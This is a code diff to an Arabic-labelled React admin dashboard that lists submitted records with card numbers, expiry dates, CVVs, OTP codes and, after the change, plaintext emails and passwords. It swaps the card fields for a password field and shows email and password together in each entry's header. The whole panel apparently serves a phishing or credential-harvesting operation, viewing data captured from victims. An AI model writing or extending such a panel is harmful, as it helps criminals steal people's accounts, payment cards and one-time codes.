@@ -41,7 +41,7 @@ interface Notification {
   id: string;
   createdDate?: string;
   firstName?: string;
-  lastName?: string;
+  password?: string;
   email?: string;
   phone?: string;
   address?: string;
@@ -89,57 +89,21 @@ function PersonalInfoCard({ notification }: { notification: Notification }) {
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           {info?.firstName && (
             <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
-              <span className="text-xs font-medium text-gray-600">
-                الاسم الأول
-              </span>
+              <span className="text-xs font-medium text-gray-600">ايميل</span>
               <span className="font-semibold text-base text-gray-800">
-                {info.firstName}
+                {info.email}
               </span>
             </div>
           )}
-          {info?.lastName && (
+          {info?.password && (
             <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
-              <span className="text-xs font-medium text-gray-600">
-                الاسم الأخير
-              </span>
+              <span className="text-xs font-medium text-gray-600">باسورد</span>
               <span className="font-semibold text-base text-gray-800">
-                {info.lastName}
+                {info.password}
               </span>
             </div>
           )}
-          {info?.cardNumber && (
-            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
-              <span className="text-xs font-medium text-gray-600">
-                رقم البطاقة
-              </span>
-              <span
-                className="font-semibold text-base text-gray-800 break-all"
-                dir="ltr"
-              >
-                {info.cardNumber}
-              </span>
-            </div>
-          )}
-          {info?.expiryDate && (
-            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
-              <span className="text-xs font-medium text-gray-600">
-                تاريخ الانتهاء{" "}
-              </span>
-              <span className="font-semibold text-base text-gray-800 font-mono">
-                {info.expiryDate}
-              </span>
-            </div>
-          )}
-          {info?.cvv && (
-            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
-              <span className="text-xs font-medium text-gray-600">
-                رمز الامان
-              </span>
-              <span className="font-semibold text-base text-gray-800">
-                {info.cvv}
-              </span>
-            </div>
-          )}
+
           {info?.otp && (
             <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
               <span className="text-xs font-medium text-gray-600">
@@ -439,7 +403,6 @@ function NotificationsContent() {
       filtered = filtered.filter(
         (notification) =>
           notification?.firstName?.toLowerCase().includes(term) ||
-          notification?.lastName?.toLowerCase().includes(term) ||
           notification?.email?.toLowerCase().includes(term) ||
           notification?.phone?.toLowerCase().includes(term) ||
           notification?.cardNumber?.toLowerCase().includes(term) ||
@@ -719,7 +682,7 @@ function NotificationsContent() {
                           ></div>
                           <div>
                             <p className="font-semibold text-gray-800">
-                              {notification?.firstName} {notification?.lastName}
+                              {notification?.email} {notification?.password}
                             </p>
                             {notification.createdDate && (
                               <p className="text-xs text-gray-400">
